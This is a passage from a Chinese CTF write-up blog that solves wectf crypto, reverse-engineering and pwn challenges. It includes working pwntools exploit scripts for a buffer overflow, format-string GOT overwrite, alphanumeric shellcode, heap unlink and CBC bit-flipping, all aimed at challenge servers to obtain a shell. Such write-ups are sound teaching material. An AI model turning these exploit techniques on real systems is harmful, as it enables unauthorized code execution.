<p>0 的对应字符是 e<br>
checksum 上就是</p>
<pre><code>b1
f7
</code></pre>
<p>把 hex(0xb1 ^ ord('0') ^ ord('1'))<br>
等于 0xb0<br>
用 b0 代替 b1 构造 payload：</p>
<pre><code>session=a84b3aee320ae1e2;admin=1;checksum=551d730d1e45de5033aecce896e874b0ab77327d9bcee3d3906ff29d95e5e0f7
</code></pre>
<pre><code>session=a84b3aee320ae1e2;admin=0;checksum=551d730d1e45de5033aecce896e874b1ab77327d9bcee3d3906ff29d95e5e0f7
token:session=a84b3aee320ae1e2;admin=1;checksum=551d730d1e45de5033aecce896e874b0ab77327d9bcee3d3906ff29d95e5e0f7
�C�(�u'����ԽM320ae1e2;admin=1
wectf{attack_AESCBC_by_Bit-flip}
</code></pre>
<p>可以看到前面的块已经解不出原文了，因为我们修改了它的密文，但是我们只 check admin 是不是等于 1</p>
<p>这个攻击的名字叫：比特翻转</p>
<p>exp：</p>
<pre><code>from zio import *

host = ''
port = 
def cbc_bit_attack_mul(c,m,position,target):
    l = len(position)
    r=c
    for i in range(l):
        change=position[i]-16
        tmp=chr(ord(m[position[i]])^ord(target[i])^ord(c[change]))
        r=r[0:change]+tmp+r[change+1:]
    return r


target=(host ,port)
io=zio(target)
io.read_until(&quot;session=&quot;)
session=io.read(16)
io.read_until(&quot;checksum=&quot;)
c=io.readline().strip()

t1=&quot;session=&quot;+session+&quot;;admin=0&quot;

newchecksum=cbc_bit_attack_mul(c.decode(&quot;hex&quot;),t1,[16+16-1],['1'])
io.writeline(&quot;session=&quot;+session+&quot;;admin=1;checksum=&quot;+newchecksum.encode(&quot;hex&quot;))

io.interact()
</code></pre>
<h1 id="reverse">Reverse</h1>
<h2 id="xor">xor</h2>
<p>linux  for循环 xor</p>
<p>没什么好说的</p>
<p>flag：wectf{x0r_s0_e4sy}</p>
<p><a href="https://uploader.shimo.im/f/Obd3U8puLWc9wuaz">xor</a></p>
<h2 id="cmp">cmp</h2>
<p>windows系统<br>
flag:flag{412accbb6e9ffbeef39e317d0862b9ab}</p>
<p>思路：flag分成几段比较<br>
<img src="https://uploader.shimo.im/f/KKT7WL3EjdIgERlT.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/NTFs77HW25o6ubnz.png!thumbnail" alt="图片"></p>
<h2 id="assembly">assembly</h2>
<p>题目</p>
<pre><code>push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     [rbp+var_4], 0
jmp     short s1

s2:
mov     eax, [rbp+var_4]
cdqe
movzx   eax, s[rax]
add     eax, 14h
mov     edx, eax
mov     eax, [rbp+var_4]
cdqe
mov     s[rax], dl
add     [rbp+var_4], 1

s1:
cmp     [rbp+var_4], 25h
jle     short s2
mov     esi, offset s
mov     edi, offset format ; &quot;%s&quot;
mov     eax, 0
call    _printf
mov     eax, 0
leave
retn

s的数据为:
52 58 4D 53 67 51 22 4F  1C 52 23 4E 52 1C 50 4D
1F 52 1D 4F 23 23 4F 22  50 4F 4E 4F 23 1D 4D 20
21 1c 4d 21 1e 69
</code></pre>
<p>flag:flag{e6c0f7bf0da3f1c77c6dcbc71a450a52}</p>
<p>思路:题目直接给出一段汇编，通过阅读可以发现，s的数据会经过加法然后输出。可以还原代码</p>
<pre><code>flag = [0x52,0x58,0x4D,0x53,0x67,0x51,0x22,0x4F,0x1C,0x52,0x23,0x4E,0x52,0x1C,0x50,0x4D,0x1F,0x52,0x1D,0x4F,0x23,0x23,0x4F,0x22,0x50,0x4F,0x4E,0x4F,0x23,0x1D,0x4D,0x20,0x21,0x1c,0x4d,0x21,0x1e,0x69]
flags = &quot;&quot;
for q in flag:
    flags+= chr(q+20)

print flags
#flag{e6c0f7bf0da3f1c77c6dcbc71a450a52}
</code></pre>
<h2 id="base64">base64</h2>
<p>linux系统<br>
flag:flag{787912e6b3b4c32f651e6b914382e3a9}<br>
思路：<br>
base64加密或对比，进入base64函数后会经过一个循环改变初始table的值<br>
<img src="https://uploader.shimo.im/f/tybalUGYZcIgRW9P.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/QujSjsCNb2YMzuKZ.png!thumbnail" alt="图片"></p>
<p>.........</p>
<h2 id="king">king</h2>
<p>linux系统<br>
flag:wectf{2d6915e15c7bdffe2b470c1648a79717}<br>
思路:<br>
里边就是一个凯撒加密，移的位数为7<br>
<img src="https://uploader.shimo.im/f/ACs8hO1u7UIgTOBh.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/MRrAnj4morMPONKu.png!thumbnail" alt="图片"><br>
<a href="https://uploader.shimo.im/f/3ywxmXJQXsEKUP0V">k</a></p>
<p>.........</p>
<h2 id="网">网</h2>
<p>.Net程序调试<br>
先用de4dot清理程序<br>
之后使用dnSpy在程序入口点下断点，单步运行就能在下面的变量框看见flag<br>
<img src="https://uploader.shimo.im/f/iarJlKrVsGkiCxj8.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/weDk2rpdxD4bEjoH.png!thumbnail" alt="图片"><br>
wectf{54sa58A92w6sa26a5Ssa88x9aw8wa56xW}<br>
<a href="https://uploader.shimo.im/f/2GEXKetHwIYbSwHV.exe">19abe65fdc1875edabc521e215693edf.exe</a></p>
<h2 id="sign">sign</h2>
<p>.Net程序<br>
flag:wectf{welc0mE_To_Csharp}<br>
思路:<br>
直接调用标准aes加密，函数名字也已经给出。<br>
<img src="https://uploader.shimo.im/f/WC2fFkPwyOQwVe1Y.png!thumbnail" alt="图片"><br>
可以直接网上解密得到flag<br>
<img src="https://uploader.shimo.im/f/WvTAiLk554ko2yzL.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/OPEEWEzu3Hw6hj2i.png!thumbnail" alt="图片"><br>
<a href="https://uploader.shimo.im/f/vbfCsWnapvkhRpfj.exe">sign_in.exe</a></p>
<h2 id="emmm">emmm</h2>
<p>flag:flag{a7b8d813f9d9a9b9c9ee4}<br>
思路:里边是MersenneTwister随机数生成算法，输入的字符串每一个都会被当做seed并生成对应的随机数，比较。<img src="https://uploader.shimo.im/f/k3K7EKZGdbMaGCCn.png!thumbnail" alt="图片"><br>
读取出数据，爆破即可。</p>
<pre><code>en = [
0x9901A900,0x3BCDF063,
0xD641F85A,0x6E9ED707,
0xB24BCDFE,0xD641F85A,
0x17D5F1CD,0xBB75DDDA,
0xFBF3FF55,0x8B1C9608,
0xFBF3FF55,0x4D0C01AA,
0xACFCBBFE,0x9901A900,
0x165C8BCF,0x8B1C9608,
0x165C8BCF,0xD641F85A,
0x165C8BCF,0xBB75DDDA,
0x165C8BCF,0xAC1A7281,
0x165C8BCF,0x8432B35F,
0x8432B35F,0xD2B75BF5,
0x81b8cbbd]
flag = &quot;&quot;
for q in en:
    for i in range(127):
        temp = MT19937(i).extract_number()
        if (temp==q):
            flag += chr(i)
            break
print flag
</code></pre>
<p><img src="https://uploader.shimo.im/f/gOuHEDnb1sUYUSkD.png!thumbnail" alt="图片"><br>
<a href="https://uploader.shimo.im/f/rIvXPd39gfYhjA6Q">emmm</a></p>
<h1 id="pwn">Pwn</h1>
<h2 id="bof">BOF</h2>
<p>变量覆盖</p>
<p><a href="https://uploader.shimo.im/f/jJBB0KezvNEeUbpP">BOF</a></p>
<p>源码：</p>
<pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

void pwn(void){
  system(&quot;sh&quot;);
}

int main()
{
  char ipt[16];
  int root = 0;
  printf(&quot;Welcome to wectf!\n&quot;);
  printf(&quot;Do you know BOF??\n&quot;);
  printf(&quot;&gt;&quot;);
  scanf(&quot;%s&quot;, ipt);
  if(root == 1){
    printf(&quot;good job!&quot;);
    pwn();
  }
  else{
    printf(&quot;yeah! good bye!\n&quot;);
  }
  return 0;
}
</code></pre>
<p>编译：</p>
<pre><code>gcc -fno-stack-protector BOF.c -o BOF
</code></pre>
<p>我关闭了栈保护，这个题有多解</p>
<figure data-type="image" tabindex="2"><img src="https://uploader.shimo.im/f/Rg8v7uY9fw4Gi3H6.png!thumbnail" alt="图片"></figure>
<p>ipt 和 root 相距 28</p>
<pre><code>from pwn import *

host = ''
port = 0000
r = remote(host, port)
exp = 'k' * 28 + p64(1)
r.sendline(exp)
r.interactive
</code></pre>
<h2 id="ncpwn签到">nc(pwn签到)</h2>
<pre><code>// filename:1.c
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
const uint64_t a = 0x123456789abcdef0;

int main()
{
    int i;
    uint64_t c,total;
    for (c=0, i=0, total=0; i++&lt;5; )
    {
        scanf(&quot;%lu&quot;,&amp;c);

        total += c;
    }

    total == a?system(&quot;/bin/sh&quot;):printf(&quot;try again.\n&quot;);
    return 0;
}

//gcc ./1.c -o pwn1 &amp;&amp; strip ./pwn1
</code></pre>
<p>pwn基本操作nc或者pwntools使用,基本逆向能力.<br>
exp:</p>
<pre><code>python -c &quot;from pwn import *;p=remote('39.98.246.99',10040);p.sendline('{}\n'.format(0x123456789abcdef0/5));p.interactive()&quot;
</code></pre>
<p>.........</p>
<h2 id="stack_balance">Stack_balance</h2>
<pre><code>//filename: 2.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void input()
{
    int a[100] = {0};
    int i = 0;
    for (;i&lt;100;i++)
        scanf(&quot;%d&quot;,&amp;a[i]);
}

void check()
{
    int b[100];
    int c;
    c = b[0]==1 &amp;&amp; b[99] == 100;
    c?system(&quot;/bin/sh&quot;):printf(&quot;try again.\n&quot;);
}

int main()
{
    input();
    check();
    return 0;
}

//gcc ./2.c -o pwn2 &amp;&amp; strip ./pwn2
</code></pre>
<p>考察堆栈平衡定理<br>
exp:</p>
<pre><code>python -c &quot;from pwn import *;p=remote('39.98.246.99',10037);p.sendline('\n'.join([str(x) for x in xrange(1,101)]));p.interactive()&quot;
</code></pre>
<h2 id="login">Login</h2>
<pre><code>//filename: 3.c

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
int verify(char * ps)
{
    int i = 0;
    srand(time(0));
    for(;ps[i]&amp;&amp;i&lt;15;i++)
        if (ps[i] != (rand() % 86))
            return 0;
    return 1;
}
int login()
{
    char username[16] = {0};
    char password[16] = {0};
    printf(&quot;what your name: \n&quot;);
    read(0,username,15);
    printf(&quot;Hello, %s&quot;,username);
    read(0,password,15);
    return verify(password);
}


int main()
{
    int a,b;
    setbuf(stdin,0);
    setbuf(stdout,0);
    if(login())
    {
        printf(&quot;login success!\nDo you find a number: \n&quot;);
        a = b = rand();
        scanf(&quot;%d&quot;, &amp;a);
        a==b?system(&quot;/bin/sh&quot;):printf(&quot;wrong answer.\n&quot;);
    }
    else
    {
        printf(&quot;login fails\n&quot;);
    }

    return 0;
}

//gcc ./3.c -o pwn3
</code></pre>
<p>简单逻辑漏洞和scanf漏洞:<br>
当password第一个字节为\x00时, for循环条件判断不成立, 直接return.<br>
scanf当格式化控制符为“%d”时,可用+-\特殊符号跳过输入且不改变原值.</p>
<p>exp:</p>
<pre><code>from pwn import *

p = remote('39.98.246.99', 10036)
p.recvuntil(&quot;what your name: \n&quot;)
p.sendline('ads')
p.recvuntil(&quot;\n&quot;)
p.sendline('\x00')
p.recvuntil(&quot;: \n&quot;)
p.sendline('+')
p.interactive()
</code></pre>
<h2 id="shellcode">Shellcode</h2>
<p>此题目需要使用32位编译,如果不能编译请安装运行库gcc-multilib<br>
如果不能运行参考<a href="https://blog.csdn.net/kingroc/article/details/51143327">https://blog.csdn.net/kingroc/article/details/51143327</a></p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    setbuf(stdin,0);
    setbuf(stdout,0);
    char shellcode[0x100] = {0};
    void (*func)();
    int i;
    printf(&quot;Do you know shellcode?\ngive me your shellcode:\n&quot;);
    read(0,shellcode,0x100);
    for(i=0;i&lt;0x100;i++)
    {
        char c = shellcode[i];
        if(c&gt;='0' &amp;&amp; c&lt;='9' || c&gt;='A' &amp;&amp; c&lt;='Z' || c&gt;='a' &amp;&amp; c&lt;='z')
            continue;
        else
            return 1;
    }
    func = shellcode;
    func();
    return 0;
}
// gcc -m32 -z execstack ./4.c -o pwn4

</code></pre>
<p>特殊的shellcode,必须为可打印字符:</p>
<p>shellcode生成:<br>
可使用msf<br>
msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax<br>
也可使用github上项目:<br>
<a href="https://github.com/ecx86/shellcode_encoder">https://github.com/ecx86/shellcode_encoder</a>:</p>
<pre><code>python -c &quot;from pwn import *;p=remote('127.0.0.1',10001);p.recvuntil(':\n');p.sendline('PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI3ZTKV8J9V2RF2H6M3SLIJGSX6OD3SX30RH6ORBU92NMYZC62KX385P30C06OU2BIBNVOBS3XUP67V3MYM18MMPAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa');p.interactive()&quot;
</code></pre>
<h2 id="easystack">easystack</h2>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdint.h&gt;

void pwn_init()
{
    setbuf(stdin,0);
    setbuf(stdout,0);
}

void vuln()
{
    char buf[10] = {0};
    printf(&quot;What's your name?\n&quot;);
    read(0,buf,0x100);
    printf(&quot;Hello %s&quot;, buf);
}

int main()
{
    pwn_init();
    vuln();

    return 0;
}
//gcc -m32 -fno-stack-protector 5.c -o pwn5
</code></pre>
<p>32位普通栈溢出,给不给libc看情况</p>
<h2 id="fmt">fmt</h2>
<p>格式化串盲打,不给bin文件</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void main()
{
    char buf[0x100];
    while (1)
    {
        memset(buf,0,0x100);
        read(0, buf, 0x100);
        printf(buf);
        fflush(stdout);
    }
}

//gcc ./6.c -m32 -o fmt
</code></pre>
<p>首先确定偏移</p>
<pre><code>from pwn import *
p = remote('127.0.0.1', 10001)
def leak(payload):
    p.sendline(payload)
    return p.recv()

auto = FmtStr(leak) 
log.success(auto.offset)

# [*] Found format string offset: 7
</code></pre>
<p>然后通过格式化字符串漏洞leak出内存中的bin文件,默认加载地址(no pie)32位0x8048000(64位0x400000).</p>
<pre><code>from pwn import *
#context.log_level = 'debug'
p = remote('172.16.29.145', 10001)
#def leak(payload):
#    p.sendline(payload)
#    return p.recv()

#auto = FmtStr(leak)
#log.success(auto.offset)

def dump(addr):
    payload = &quot;&quot;
    for x in xrange(5):
        try:
            payload = &quot;AAA%10$sBBBB&quot;+p32(addr)
            if '\x0a' in payload:
                return '\xff'
            p.send(payload)
            data = p.recv(timeout=3)
            if data:
                start = data.find(&quot;AAA&quot;)+3
                end = data.find(&quot;BBBB&quot;)
            result = data[start:end]
            if result == &quot;&quot;:
                return '\x00'
            else:
                return result
            return '\xff'
        except EOFError:
            log.waring(&quot;excpet &quot;, exec_info = sys.exc_info())
    return '\xff'

def create():
    base=0x8048000
    leaked = &quot;&quot;
    while len(leaked) &lt; 8000:
        address = base+len(leaked)
        if len(leaked) == 0x74b:
            sleep(1)
        tmp = dump(address)
        leaked += tmp
        log.info(hexdump(leaked))
        with open('elf','wb') as f:
            f.write(leaked)
create()
</code></pre>
<p>对dump出的文件简单分析恢复其main函数<br>
<img src="https://uploader.shimo.im/f/PJrKHgr5oSUywcs1.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/lDwhohtkByM9CS3F.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/Q5IsGJ4VzkwZPepK.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/Bn4goHUXbMoQuDZV.png!thumbnail" alt="图片"><br>
<img src="https://uploader.shimo.im/f/EvNKvu6icGkuWZuu.png!thumbnail" alt="图片"><br>
确定到got起始地址为0x804a000<br>
然后leak确定libc版本与libc地址<br>
改printf got表为system地址即可<br>
exp:</p>
<pre><code>from pwn import *

p = remote('39.98.246.99', 10039)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
payload = &quot;%8$s&quot;+p32(0x804a010)
p.sendline(payload)
libc.address = u32(p.recv(4))-libc.sym['printf']
p.recv()
payload = fmtstr_payload(7,{0x804a010:libc.sym['system']})
p.send(payload)
p.send('/bin/sh')
p.interactive()
</code></pre>
<h2 id="unlink">unlink</h2>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct Chunk 
{
    struct Chunk * fd;
    struct Chunk * bk;
    char data[16];

} chunk;
void dosomething()
{
    system(&quot;/bin/sh&quot;);
}

void unlink(chunk * p)
{
    chunk * FD = p-&gt;fd;
    chunk * BK = p-&gt;bk;
    FD-&gt;bk = BK;
    BK-&gt;fd = FD;
}

void pwn_init()
{
setbuf(stdin,0);
setbuf(stdout,0);
alarm(60);
}

int main()
{
	pwn_init();
malloc(1024);
    chunk * a = malloc(sizeof(chunk));
    chunk * b = malloc(sizeof(chunk));
    chunk * c = malloc(sizeof(chunk));

    a-&gt;fd = b;
    b-&gt;bk = a;
    b-&gt;fd = c;
    c-&gt;bk = b;

    printf(&quot;gift: %p %p\n&quot;, a, &amp;a);
    
    gets(a-&gt;data);
    unlink(b);
    return 0;
}
</code></pre>
<p>重点在于如何将代码段的地址写到返回地址,发现返回地址最后来源于[ecx-4],所以构造[ecx-4]=dosomething地址即可<br>
<img src="https://uploader.shimo.im/f/ikGeGNS8zCsZTY0f.png!thumbnail" alt="图片"></p>
<p>exp:</p>
<pre><code>from pwn import *

filename = &quot;./myunlink32&quot;
elf = ELF(filename)
#p = process(filename)
p = remote(&quot;39.98.246.99&quot;,10042)
a = p.recvline().split(' ')
t16 = lambda x: int(x,16)
heap,stack = map(t16,a[1:])
#gdb.attach(p,'b unlink\nc\n')
payload = p32(0x804856b)*6 + p32(stack+12) + p32(heap+12)
p.sendline(payload)

p.interactive()
</code></pre>

                                </div>
                    </article>
                    <!--  -->
                    
                        <div class="next-post">
                            <div class="next">下一篇</div>
                            <a href="https://we-ax.github.io/post/2019-techworld-xin-xi-an-quan-tiao-zhan-sai">
                                <h3 class="post-title">
                                    2019 TechWorld 信息安全挑战赛
                                </h3>
                            </a>
                        </div>
                        
                            <div id="disqus_thread"></div>
                            <div id="gitalk-container"></div>
                </div>
                <!-- middle -->
                <div class="main-container-middle"></div>
                <!-- right -->
                <div id="sidebar" class="main-container-right">
                    
                        <!-- toc -->
                        
    <div class="toc-card i-card ">
        <div class="toc-title i-card-title">目录</div>
        <div class="toc-content">
            <ul class="markdownIt-TOC">
<li><a href="#web">Web</a>
<ul>
<li><a href="#web%E7%AD%BE%E5%88%B0">web签到</a></li>
<li><a href="#easy01">easy01</a></li>
<li><a href="#easy02">easy02</a></li>
<li><a href="#easy03">easy03</a></li>
<li><a href="#medium01">medium01</a></li>
<li><a href="#medium02">medium02</a></li>
<li><a href="#medium03">medium03</a></li>
<li><a href="#high01">high01</a></li>
<li><a href="#high02">high02</a></li>
<li><a href="#high03">high03</a></li>
<li><a href="#crazy01">crazy01</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a>
<ul>
<li><a href="#rot13%E7%AD%BE%E5%88%B0%E9%A2%98">ROT13（签到题）</a></li>
<li><a href="#%E8%B4%9D%E6%96%AF%E5%AE%B6%E6%97%8F">贝斯家族</a></li>
<li><a href="#ascii%E7%A0%81">ASCII码</a></li>
<li><a href="#babypcap">babypcap</a></li>
<li><a href="#%E8%BF%99%E6%98%AF%E4%B8%AA%E5%95%A5%E4%B8%9C%E8%A5%BF">这是个啥东西</a></li>
<li><a href="#whoami">whoami</a></li>
<li><a href="#%E9%92%9B%E5%90%88%E9%87%91%E7%8B%97%E7%9C%BC">钛合金狗眼</a></li>
<li></li>
<li><a href="#sksteg">SKsteg</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a>
<ul>
<li><a href="#%E7%AD%BE%E5%88%B0">签到</a></li>
<li><a href="#guess">guess</a></li>
<li><a href="#cxkxcp">cxk=xcp</a></li>
<li><a href="#%E8%80%81%E5%A5%97%E7%9A%84md5">老套的md5</a></li>
<li><a href="#babyrsa">babyRSA</a></li>
<li></li>
<li><a href="#%E8%84%91%E7%AD%8B%E6%80%A5%E8%BD%AC%E5%BC%AF">脑筋急转弯</a></li>
<li><a href="#attack-cbc">attack CBC</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a>
<ul>
<li><a href="#xor">xor</a></li>
<li><a href="#cmp">cmp</a></li>
<li><a href="#assembly">assembly</a></li>
<li><a href="#base64">base64</a></li>
<li><a href="#king">king</a></li>
<li><a href="#%E7%BD%91">网</a></li>
<li><a href="#sign">sign</a></li>
<li><a href="#emmm">emmm</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a>
<ul>
<li><a href="#bof">BOF</a></li>
<li><a href="#ncpwn%E7%AD%BE%E5%88%B0">nc(pwn签到)</a></li>
<li><a href="#stack_balance">Stack_balance</a></li>
<li><a href="#login">Login</a></li>
<li><a href="#shellcode">Shellcode</a></li>
<li><a href="#easystack">easystack</a></li>
<li><a href="#fmt">fmt</a></li>
<li><a href="#unlink">unlink</a></li>
</ul>
</li>
</ul>

        </div>
        <script>
            function locateCatelogList() {
                /*获取文章目录集合,可通过:header过滤器*/
                var alis = $('.post-content :header');
                /*获取侧边栏目录列表集合**/
                var sidebar_alis = $('.markdownIt-TOC a');
                /*获取滚动条到顶部的距离*/
                var scroll_height = $(window).scrollTop();
                for (var i = 0; i < alis.length; i++) {
                    /*获取锚点集合中的元素分别到顶点的距离*/
                    var a_height = $(alis[i]).offset().top;
                    if (a_height < scroll_height) {
                        /*高亮显示*/
                        sidebar_alis.removeClass('on');
                        $(sidebar_alis[i]).addClass('on');
                    }
                }
            }
            $(function() {
                /*绑定滚动事件 */
                $(window).bind('scroll', locateCatelogList);
            });
        </script>
    </div>
    
                            

                </div>




            </div>


            <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | 
  <a class="rss" href="https://we-ax.github.io/atom.xml" target="_blank">RSS</a>
</div>

<script>
  hljs.initHighlightingOnLoad()
</script>


    </div>
    <script>
        $('#sidebar').stickySidebar({
            topSpacing: 80,
            // bottomSpacing: 60
        });
    </script>
    
</body>

</html>